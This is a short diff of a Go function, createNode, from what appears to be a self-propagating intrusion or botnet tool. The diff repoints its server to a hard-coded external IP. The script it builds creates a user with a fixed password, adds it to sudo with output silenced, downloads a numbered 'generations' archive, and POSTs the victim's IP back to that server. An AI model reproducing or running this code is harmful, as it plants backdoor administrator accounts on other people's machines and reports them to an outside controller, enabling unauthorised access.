@@ -158,7 +158,7 @@ func createNode(ip string, generation int) {
 		/**
 		 * TODO: set server url
 		 */
-		fmt.Sprintf(`keys="http://5.180.181.43:9999/generations/%d.tar"`, generation),
+		fmt.Sprintf(`keys="http://113.30.188.94:9999/generations/%d.tar"`, generation),
 
 		`useradd -m -p "pass" -s /bin/bash "$username" > /dev/null 2>&1`,
 		`usermod -a -G sudo "$username" > /dev/null 2>&1`,
@@ -197,7 +197,7 @@ func createNode(ip string, generation int) {
 		 * TODO: set server url
 		 */
 		`IP=$(hostname -I)`,
-		fmt.Sprintf(`curl -X POST -d "{\"ip\": \"$IP\", \"exists\": true, \"generation\": %d}" http://127.0.0.1:9999`, generation),
+		fmt.Sprintf(`curl -X POST -d "{\"ip\": \"$IP\", \"exists\": true, \"generation\": %d}" http://113.30.188.94:9999`, generation),
 	}
 
 	for _, command := range script {
